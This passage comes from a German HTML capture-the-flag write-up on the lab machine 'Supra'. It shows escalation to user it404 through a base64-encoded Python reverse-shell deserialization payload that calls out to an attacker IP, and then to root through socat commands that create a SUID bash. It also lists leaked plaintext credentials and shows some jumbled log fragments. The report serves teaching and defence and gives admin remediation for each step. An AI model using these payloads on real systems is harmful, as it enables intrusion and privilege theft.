+1.  Wechsel in das `/home`-Verzeichnis und Auflisten des Inhalts. Es existiert ein Benutzerverzeichnis `it404`.
+2.  Wechsel in `/home/it404` und Auflisten des Inhalts. Eine Datei namens `local.txt` wird gefunden (vermutlich die User-Flag).
+3.  Versuch, `local.txt` zu lesen, schlägt fehl (`Permission denied`), da `www-data` nicht die nötigen Rechte hat.
+4.  Versuch, `sudo -l` auszuführen, schlägt fehl (`command not found`), was bedeutet, dass `sudo` entweder nicht installiert ist oder nicht im PATH von `www-data` liegt. Dies schließt eine Eskalation über Sudo-Regeln aus.</p>
+             <p class="evaluation">**Bewertung:** Der Benutzer `it404` wurde als nächstes Ziel identifiziert. Direkter Zugriff auf seine Flag oder Eskalation über `sudo` ist für `www-data` nicht möglich. Es müssen andere Wege gefunden werden, um als `it404` agieren zu können.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie weiter nach Schwachstellen oder Fehlkonfigurationen:
+    *   Überprüfen Sie laufende Prozesse (`ps aux`) und Netzwerkverbindungen (`ss -tulnp`, `netstat -an`). Gibt es Dienste, die lokal laufen und eventuell ausgenutzt werden können?
+    *   Suchen Sie nach Konfigurationsdateien im Web-Root (`/var/www/`, `/opt/api/`) oder anderen Orten, die Zugangsdaten enthalten könnten.
+    *   Prüfen Sie auf Cronjobs (`ls -la /etc/cron.*`).
+    *   Suchen Sie nach Kernel-Exploits (`uname -a`).<br>
+**Empfehlung (Admin):** Stellen Sie sicher, dass Dateiberechtigungen korrekt gesetzt sind (Least Privilege). Installieren Sie `sudo`, wenn es für administrative Aufgaben benötigt wird, und konfigurieren Sie es sicher.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment">echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -UNIX-CLIENT:/usr/local/src/socket.s</span></pre> <span class="comment"><-- Dieser Befehl wird später relevant, Kontext fehlt hier --></span>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser Befehl wird hier im Log gezeigt, gehört aber logisch zur späteren Eskalation von `it404` zu `root`. Er versucht, über `socat` mit einem Unix-Socket (`/usr/local/src/socket.s`) zu kommunizieren und ihm Befehle zu senden, um eine SUID-Bash in `/tmp` zu erstellen.</p>
+             <p class="evaluation">**Bewertung:** Im Kontext der Eskalation von `www-data` zu `it404` ist dieser Befehl irrelevant. Er deutet jedoch auf einen späteren Eskalationsvektor hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ignorieren Sie diesen Befehl vorerst und konzentrieren Sie sich darauf, als `it404` zu gelangen.<br>**Empfehlung (Admin):** Untersuchen Sie den Zweck und die Sicherheit des Unix-Sockets `/usr/local/src/socket.s`. Wenn er unsicher ist, deaktivieren oder sichern Sie ihn.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@Supra:/tmp$ <span class="command">netstat -an | grep socket</span></div>
+                      <pre>
+Active UNIX domain sockets (servers and established)
+unix  2      [ ACC ]     STREAM     LISTENING     11387    /run/dbus/system_bus_socket
+unix  6      [ ]         DGRAM                    10633    /run/systemd/journal/socket
+<span class="command">unix  2      [ ACC ]     STREAM     LISTENING     11832    /usr/local/src/socket.s</span> <span class="password"><-- Interessanter Socket gefunden! --></span>
+unix  3      [ ]         STREAM     CONNECTED     11666    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     11668    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     11665    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     11667    /run/dbus/system_bus_socket</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Befehl `netstat -an | grep socket` (oder alternativ `ss -lx | grep socket`) wird verwendet, um nach aktiven Unix Domain Sockets zu suchen.</p>
+              <p class="evaluation">**Bewertung:** Neben den Standard-System-Sockets wird ein interessanter Socket gefunden: `/usr/local/src/socket.s`. Dieser Socket lauscht (`LISTENING`) und könnte ein Interprozesskommunikationskanal sein, der potenziell für eine Eskalation missbraucht werden kann, wie der vorherige `socat`-Befehl andeutete.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie diesen Socket weiter. Wer hat ihn erstellt (`lsof /usr/local/src/socket.s` oder `ps aux | grep [PID von netstat/ss]`)? Welche Rechte hat die Datei (`ls -la /usr/local/src/socket.s`)? Kann `www-data` darauf schreiben? Versuchen Sie, mit `socat` oder `nc -U` damit zu kommunizieren.<br>**Empfehlung (Admin):** Überprüfen Sie den Zweck dieses Sockets. Wenn er von einer benutzerdefinierten Anwendung stammt, stellen Sie sicher, dass er sicher implementiert ist und keine unautorisierten Befehle entgegennimmt.</p>
+
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 192.168.2.109:8082/read-leaked-accounts</span></div>
+                       <pre>
+<span class="comment">accounts.yaml
+emails:
+
+  - Gloriawrong@zonnetd.nl
+  - cheerfulMark93@atbt.net
+  - horribleMicheal30@aliceaedsl.fr
+  - Tamaradull@aiam.com
+  - Grantitchy@lieve.ca
+  - easyAngelica60@heatnet.nl
+  - Rebekaheasy@lieve.com
+  - zealousKatelyn@ggmail.com
+  - depressedBridget62@yahooi.com.ar
+  - fierceBrooke@optoniline.net
+
+passwords:
+
+  - <span class="password">6NpjqVCM</span>
+  - <span class="password">mzPdgc9V</span>
+  - <span class="password">fpRze8bn</span>
+  - <span class="password">x4Lm3W6M</span>
+  - <span class="password">tYUBN6Qx</span>
+  - <span class="password">8zNBxXcd</span>
+  - <span class="password">X48UYKrw</span>
+  - <span class="password">xEfjB39C</span>
+  - <span class="password">Wk956r4a</span>
+  - <span class="password">UKQC5q2a</span></span><span class="prompt">www-data@Supra:/opt/api$</span> <span class="comment"><-- Prompt hier fehl am Platz --></span></pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Der Pentester führt von seiner Maschine aus einen `curl`-Befehl gegen Port 8082 des Ziels aus, um den Endpunkt `/read-leaked-accounts` abzufragen. *Anmerkung: Nmap hatte Port 8082 nicht als offen angezeigt. Es ist wahrscheinlich, dass dieser Port nur lokal auf dem Zielsystem lauscht (Loopback-Interface 127.0.0.1) und der curl-Aufruf eigentlich aus der `www-data`-Shell hätte erfolgen müssen.* Die Ausgabe ist eine YAML-Datei (`accounts.yaml`), die eine Liste von E-Mail-Adressen und zugehörigen Passwörtern im Klartext enthält.</p>
+               <p class="evaluation">**Bewertung:** Ein massives Informationsleck! Klartext-Passwörter werden über einen (vermutlich internen) API-Endpunkt preisgegeben. Diese Zugangsdaten könnten für den Benutzer `it404` oder andere Dienste gültig sein.</p>
+               <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Überprüfen Sie, ob Port 8082 tatsächlich nur lokal lauscht (`ss -lntp | grep 8082` oder `netstat -lntp | grep 8082` in der `www-data`-Shell).
+    2.  Führen Sie den `curl`-Aufruf von der `www-data`-Shell aus: `curl 127.0.0.1:8082/read-leaked-accounts`.
+    3.  Versuchen Sie, sich mit den geleakten E-Mail/Passwort-Kombinationen bei SSH (als Benutzer `it404`, falls eine E-Mail passt?) oder anderen potenziellen Diensten anzumelden. *Da der nächste Schritt Python Deserialization beinhaltet, ist es wahrscheinlich, dass einer dieser Accounts (z.B. `fierceBrooke@optoniline.net`) für einen Exploit auf einem anderen Endpunkt von Port 8081 relevant ist.*<br>
+**Empfehlung (Admin):** Entfernen Sie sofort den `/read-leaked-accounts`-Endpunkt und die zugrundeliegende `accounts.yaml`-Datei. Speichern Sie niemals Passwörter im Klartext. Untersuchen Sie, warum dieser interne Dienst existiert und sichern Sie ihn ab (Authentifizierung, Zugriffsbeschränkung).</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <pre><span class="comment">*
+                                                   Privilege Escalation
+=</span></pre>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">git clone https://github.com/j0lt-github/python-deserialization-attack-payload-generator</span></div>
+                       <pre>
+Klone nach 'python-deserialization-attack-payload-generator'...
+remote: Enumerating objects: 97, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 97 (delta 0), reused 0 (delta 0), pack-reused 94
+Empfange Objekte: 100% (97/97), 35.46 KiB | 1.42 MiB/s, fertig.
+Löse Unterschiede auf: 100% (49/49), fertig.</pre>
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd python-deserialization-attack-payload-generator</span></div>
+                        <div class="prompt">┌──(root㉿cyber)-[~/python-deserialization-attack-payload-generator]
+└─# <span class="command">ll</span></div>
+                        <pre>
+insgesamt 48
+-rw-r--r-- 1 root root 35149 21. Okt 15:57 LICENSE
+-rw-r--r-- 1 root root  3904 21. Okt 15:57 peas.py
+-rw-r--r-- 1 root root   354 21. Okt 15:57 README.md
+-rw-r--r-- 1 root root    30 21. Okt 15:57 requirements.txt</pre>
+                       <div class="prompt">┌──(root㉿cyber)-[~/python-deserialization-attack-payload-generator]
+└─# <span class="command">chmod +x peas.py</span></div>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Der Pentester klont auf seiner lokalen Maschine ein GitHub-Repository, das ein Werkzeug (`peas.py`) zur Generierung von Payloads für Python-Deserialisierungsangriffe enthält. Das Skript wird ausführbar gemacht.</p>
+               <p class="evaluation">**Bewertung:** Dies deutet darauf hin, dass eine Python-Deserialisierungs-Schwachstelle auf dem Zielsystem vermutet oder identifiziert wurde, wahrscheinlich in der internen API auf Port 8081.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die interne API auf Port 8081 (erreichbar aus der `www-data`-Shell via `curl 127.0.0.1:8081/...`) auf Endpunkte, die serialisierte Daten (vermutlich Python Pickles) entgegennehmen. Verwenden Sie `peas.py`, um einen geeigneten Payload (z.B. für eine Reverse Shell) zu generieren.<br>**Empfehlung (Admin):** Überprüfen Sie die interne API auf die Verwendung unsicherer Deserialisierungsfunktionen (wie `pickle.load`). Ersetzen Sie diese durch sichere Alternativen (z.B. JSON mit Validierung) oder implementieren Sie strikte Validierung und Signierung der serialisierten Daten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">=
+ wget http://192.168.2.153:8000/haccounts-vuln.yaml -O accounts.yaml <span class="comment"><-- Fehlerhaftes Kommando oder falscher Kontext --></span>
+curl 192.168.2.109:8082/read-leaked-accounts <span class="comment"><-- Erneuter Aufruf? --></span>
+
+"<span class="password">__import__('os').system(str(__import__('base64').b64decode('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0p3MuY29ubmVjdCgoIjE5Mi4xNjguMi4xNTMiLDY2Nikp29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEp29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5yBwdHkuc3Bhd24oImJhc2giKSc=').decode()))</span>"
+
+<span class="comment">#</span>
+
+<span class="password">cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0p3MuY29ubmVjdCgoIjE5Mi4xNjguMi4xNTMiLDY2Nikp29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEp29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5yBwdHkuc3Bhd24oImJhc2giKSc=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Dieser Block enthält verschiedene Elemente:
+1.  Ein `wget`-Befehl, der wahrscheinlich fehlerhaft ist oder aus einem anderen Kontext stammt.
+2.  Ein erneuter `curl`-Aufruf zum Auslesen der geleakten Accounts (redundant).
+3.  Ein Python-Code-Snippet, das einen Base64-kodierten String dekodiert und den resultierenden Befehl mit `os.system()` ausführt. Dies ist der Deserialisierungs-Payload, der von `peas.py` (oder einem ähnlichen Tool) generiert wurde.
+4.  Der Base64-kodierte String selbst wird nochmals separat gezeigt.</p>
+               <p class="evaluation">**Bewertung:** Der Kern ist der Python-Deserialisierungs-Payload. Der Base64-dekodierte Befehl ist eine Python3-Reverse-Shell, die sich zur Angreifer-IP `192.168.2.153` auf Port `666` verbindet. Dieser Payload muss an den verwundbaren Endpunkt der internen API (Port 8081) gesendet werden.</p>
+               <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Identifizieren Sie den genauen Endpunkt und die Methode (POST/GET?), um den Deserialisierungs-Payload an die API auf 127.0.0.1:8081 zu senden (aus der `www-data`-Shell). Dies erfordert wahrscheinlich die Analyse der API, z.B. durch Lesen des Quellcodes (`app.js`?) oder weiteres Fuzzing.
+    2.  Starten Sie einen Listener auf dem Angreifer (`192.168.2.153`) auf Port 666: `nc -lvnp 666`.
+    3.  Senden Sie den Payload an den verwundbaren Endpunkt.<br>
+**Empfehlung (Admin):** Beheben Sie die Deserialisierungs-Schwachstelle.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@Supra:/opt/api$ <span class="command">ss -an | grep 127.0.0.1</span></div>
+                      <pre>
+<span class="command">tcp   LISTEN 0      128                                     127.0.0.1:8081              0.0.0.0:*</span>
+<span class="command">tcp   LISTEN 0      20                                      127.0.0.1:25                0.0.0.0:*</span></pre>
+                      <div class="prompt">www-data@Supra:/opt/api$ <span class="command">curl http://192.168.2.109:8081</span></div>
+                      <pre>curl: (7) Failed to connect to 192.168.2.109 port 8081: Connection refused</pre>
+                      <div class="prompt">www-data@Supra:/opt/api$ <span class="command">curl 127.0.0.1:8081</span></div>
+                      <pre>Supra Internals</pre>
+                      <div class="prompt">www-data@Supra:/opt/api$ <span class="command">curl 127.0.0.1:8081/fierceBrooke@optoniline.net</span></div>
+                      <pre>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p></pre>
+                      <div class="prompt">www-data@Supra:/opt/api$ <span class="command">curl 127.0.0.1:8081/read-leaked-accounts</span></div>
+                      <pre>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Aus der `www-data`-Shell werden Netzwerkverbindungen und die interne API untersucht:
+1.  `ss -an | grep 127.0.0.1`: Bestätigt, dass Port 8081 (und der Mailserver auf Port 25) nur auf dem Loopback-Interface (127.0.0.1) lauscht und nicht von außen erreichbar ist.
+2.  `curl http://192.168.2.109:8081`: Der Versuch, von außen auf Port 8081 zuzugreifen, schlägt erwartungsgemäß fehl ("Connection refused").
+3.  `curl 127.0.0.1:8081`: Zugriff auf die Wurzel der internen API gelingt und gibt "Supra Internals" zurück.
+4.  `curl 127.0.0.1:8081/fierceBrooke@optoniline.net`: Versuch, eine der geleakten E-Mails als Endpunkt aufzurufen, führt zu einem 404 (Not Found).
+5.  `curl 127.0.0.1:8081/read-leaked-accounts`: Der erneute Versuch, die Konten von innen abzurufen, führt nun zu einem 500 (Internal Server Error). Möglicherweise wurde die `accounts.yaml`-Datei verschoben oder der Endpunkt funktioniert nicht mehr korrekt, nachdem er einmal aufgerufen wurde.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt, dass Port 8081 nur intern erreichbar ist. Die API existiert, aber der genaue Endpunkt für den Deserialisierungsangriff ist noch nicht klar identifiziert oder wird hier nicht gezeigt. Der Fehler 500 bei `/read-leaked-accounts` könnte auf Probleme in der Anwendung hindeuten.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Der nächste Schritt (Empfang der Shell als `it404`) impliziert, dass der Deserialisierungs-Payload erfolgreich an einen (nicht gezeigten) Endpunkt der API auf 127.0.0.1:8081 gesendet wurde. Dies erforderte wahrscheinlich weiteres Fuzzing oder Analyse des API-Codes.<br>**Empfehlung (Admin):** Sichern Sie die interne API ab. Entfernen Sie unnötige Endpunkte. Implementieren Sie Authentifizierung und Autorisierung. Beheben Sie die Deserialisierungs-Schwachstelle und den Internal Server Error.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="comment">*</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/python-deserialization-attack-payload-generator]
+└─# <span class="command">nc -lvnp 666</span></div>
+                      <pre>
+listening on [any] 666 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.109] 35992</span> <span class="password"><-- Verbindung erhalten!</span></pre>
+                       <div class="prompt">it404@Supra:/opt/api$ <span class="comment"># Shell als it404!</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 666 (Angreifer-IP `192.168.2.153`) empfängt eine Verbindung vom Zielsystem (`192.168.2.109`). Der Shell-Prompt zeigt `it404@Supra:/opt/api$`. (*Impliziert: Der Python-Deserialisierungs-Payload wurde erfolgreich an die interne API gesendet.*)</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Der Python-Deserialisierungsangriff war erfolgreich und hat eine Reverse Shell mit den Rechten des Benutzers `it404` erzeugt. Die Privilegieneskalation von `www-data` zu `it404` ist abgeschlossen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell (falls nötig). Führen Sie Enumeration als `it404` durch (`id`, `sudo -l`, `ls -la ~`, etc.). Suchen Sie nach der User-Flag (`local.txt`) und Wegen zur Root-Eskalation.<br>**Empfehlung (Admin):** Beheben Sie die Deserialisierungs-Schwachstelle.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">it404@Supra:/opt/api$ <span class="command">cd</span></div>
+                      <div class="prompt">it404@Supra:~$ <span class="command">ls</span></div>
+                      <pre>local.txt</pre>
+                      <div class="prompt">it404@Supra:~$ <span class="command">cat local.txt</span></div>
+                      <pre><span class="password">51cd198c3850df9cbca35f2d7609a5cc</span></pre> <span class="comment"><-- User Flag --></span>
+                      <pre><span class="comment">it404</span> <span class="comment"><-- Ausgabe des Benutzernamens hier? --></span></pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Als Benutzer `it404` wird in das Home-Verzeichnis gewechselt. Die Datei `local.txt` wird gefunden und ihr Inhalt (`51cd198c3850df9cbca35f2d7609a5cc`) wird ausgegeben. Die zusätzliche Ausgabe "it404" ist unklar, möglicherweise ein Artefakt oder Teil des Dateiinhalts.</p>
+              <p class="evaluation">**Bewertung:** Die User-Flag wurde erfolgreich gelesen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** User-Flag notiert. Konzentrieren Sie sich nun auf die Eskalation zu Root.<br>**Empfehlung (Admin):** Keine spezifische Aktion hier.</p>
+         </section>
+
+        <section id="privilege-escalation-it404">
+             <h2>Privilege Escalation (it404 -> root)</h2>
+             <p class="analysis">**Analyse:** Als Benutzer `it404` wird nach dem letzten Schritt zur Erlangung von Root-Rechten gesucht. Der Fokus liegt auf dem zuvor entdeckten Unix-Socket.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">it404@Supra:~$ <span class="command">netstat -an | grep socket</span></div>
+                     <pre>
+Active UNIX domain sockets (servers and established)
+unix  2      [ ACC ]     STREAM     LISTENING     11387    /run/dbus/system_bus_socket
+unix  6      [ ]         DGRAM                    10633    /run/systemd/journal/socket
+<span class="command">unix  2      [ ACC ]     STREAM     LISTENING     11832    /usr/local/src/socket.s</span> <span class="password"><-- Der bekannte Socket --></span>
+unix  3      [ ]         STREAM     CONNECTED     11666    /run/dbus/system_bus_socket
+[...] <span class="comment">(Restliche Verbindungen wie zuvor)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Erneute Überprüfung der Unix Domain Sockets bestätigt das Vorhandensein des lauschenden Sockets `/usr/local/src/socket.s`.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt das Ziel für den nächsten Eskalationsversuch.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Berechtigungen des Sockets (`ls -la /usr/local/src/socket.s`) und den Prozess, der ihn besitzt. Wenn `it404` darauf schreiben kann, versuchen Sie, Befehle über `socat` zu senden.<br>**Empfehlung (Admin):** Socket untersuchen und absichern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - 127.0.0.1:/usr/local/src/socket.s <span class="comment"><-- Falsches Zielformat --></span>
+
+
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - 192.168.2.109/usr/local/src/socket.s <span class="comment"><-- Falsches Zielformat --></span>
+=
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - 11832/usr/local/src/socket.s <span class="comment"><-- Falsches Zielformat --></span>
+
+┌──(root㉿cyber)-[~]<span class="command">echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s</span> <span class="comment"><-- Falscher Pfad? --></span>
+└─#</span> <span class="comment"><-- Fehlerhafter Prompt --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Dieser Block zeigt mehrere Versuche oder Überlegungen des Pentesters, den `socat`-Befehl zu konstruieren, um mit dem Unix-Socket zu interagieren. Die meisten Formate sind falsch (`127.0.0.1:...`, `192.168.2.109/...`, `11832/...`). Der letzte Versuch (`socat - UNIX-CLIENT:/tmp/socket_test.s`) verwendet das korrekte Format für Unix-Sockets (`UNIX-CLIENT:`), aber einen falschen Pfad (`/tmp/socket_test.s` statt `/usr/local/src/socket.s`). Der Befehl, der an den Socket gesendet werden soll, ist klar: Kopiere `/bin/bash` nach `/tmp/bash`, setze das SUID-Bit (`chmod +s`) und mache es ausführbar (`chmod +x`).</p>
+              <p class="evaluation">**Bewertung:** Zeigt den Denkprozess und die Schwierigkeit, die korrekte `socat`-Syntax zu finden. Der Plan ist, den Prozess, der auf dem Socket lauscht (vermutlich mit Root-Rechten), dazu zu bringen, eine SUID-Bash zu erstellen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie den korrekten `socat`-Befehl aus der `it404`-Shell: `echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/usr/local/src/socket.s`.<br>**Empfehlung (Admin):** Der Socket nimmt offenbar unsanitisierte Befehle entgegen und führt sie aus. Dies ist eine massive Schwachstelle. Der lauschende Prozess muss identifiziert und korrigiert oder der Socket entfernt werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="comment">#</span></pre>
+                      <div class="prompt">it404@Supra:/tmp$ <span class="command">echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - unix-client:/usr/local/src/socket.s</span></div>
+                       <div class="prompt">it404@Supra:/tmp$ <span class="command">ls</span></div>
+                       <pre>
+<span class="command">bash</span> <span class="password"><-- Datei erstellt!</span>
+f <span class="comment"><-- Überbleibsel der Reverse Shell Pipe --></span>
+systemd-private-80e015c41f404e2cab8f2fdf890b8879-apache2.service-KCLeCi
+systemd-private-80e015c41f404e2cab8f2fdf890b8879-systemd-logind.service-Rrdmci
+systemd-private-80e015c41f404e2cab8f2fdf890b8879-systemd-timesyncd.service-FR5nyg</pre>
+                       <div class="prompt">it404@Supra:/tmp$ <span class="command">/tmp/bash -p</span></div>
+                       <div class="prompt">bash-5.1# <span class="comment"># Root-Shell erhalten!</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:**
+1.  Der korrekte `socat`-Befehl wird nun aus der `it404`-Shell ausgeführt, um die Befehle zum Erstellen der SUID-Bash an den Unix-Socket zu senden.
+2.  `ls` im `/tmp`-Verzeichnis zeigt, dass die Datei `bash` erfolgreich erstellt wurde.
+3.  Die SUID-Bash wird mit `/tmp/bash -p` ausgeführt. Die Option `-p` sorgt dafür, dass die effektiven Rechte (Root, aufgrund des SUID-Bits) beibehalten werden.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Der Prompt wechselt zu `bash-5.1#`, was eine Root-Shell anzeigt. Der unsichere Unix-Socket konnte ausgenutzt werden, um eine SUID-Kopie von Bash zu erstellen und damit Root-Rechte zu erlangen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus, um die Root-Rechte zu bestätigen. Lesen Sie die Root-Flag (`/root/proof.txt`).<br>**Empfehlung (Admin):** Beheben Sie die Schwachstelle mit dem Unix-Socket `/usr/local/src/socket.s`. Entfernen Sie die erstellte SUID-Bash `/tmp/bash`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">bash-5.1# <span class="command">cd</span></div>
+                     <div class="prompt">bash-5.1# <span class="command">ls</span></div>
+                     <pre>local.txt</pre> <span class="comment"><-- Im Root-Home? Unwahrscheinlich. Wahrscheinlich /home/it404 --></span>
+                     <div class="prompt">bash-5.1# <span class="command">cd /root/</span></div>
+                     <div class="prompt">bash-5.1# <span class="command">ls</span></div>
+                     <pre>proof.txt</pre>
+                     <div class="prompt">bash-5.1# <span class="command">cat proof.txt</span></div>
+                     <pre><span class="password">3d7121ef7752d55a72c938af2248d777</span></pre> <span class="comment"><-- Root Flag --></span>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** In der Root-Shell wird zuerst `cd` und `ls` ausgeführt, was `local.txt` zeigt (wahrscheinlich, weil `/tmp/bash -p` das aktuelle Verzeichnis beibehält, das `/tmp` war, oder weil `cd` ohne Argument zum Home des *ursprünglichen* Benutzers `it404` wechselt?). Dann wird explizit nach `/root` gewechselt, `ls` zeigt `proof.txt`, und der Inhalt wird mit `cat` ausgegeben.</p>
+             <p class="evaluation">**Bewertung:** Die Root-Flag (`3d7121ef7752d55a72c938af2248d777`) wurde erfolgreich aus `/root/proof.txt` gelesen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Beide Flags gefunden, Ziel erreicht.<br>**Empfehlung (Admin):** Keine spezifische Aktion hier.</p>
+        </section>
+
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/it404/local.txt</div> <span class="comment"><-- Pfad aus Enumeration und Fund --></span>
+                           <div class="flag-value"><span class="password">51cd198c3850df9cbca35f2d7609a5cc</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/proof.txt</div>
+                            <div class="flag-value"><span class="password">3d7121ef7752d55a72c938af2248d777</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 21. Oktober 2022</p> <!-- Datum aus Nmap-Scan -->
+    </footer>
+</body>
+</html> 
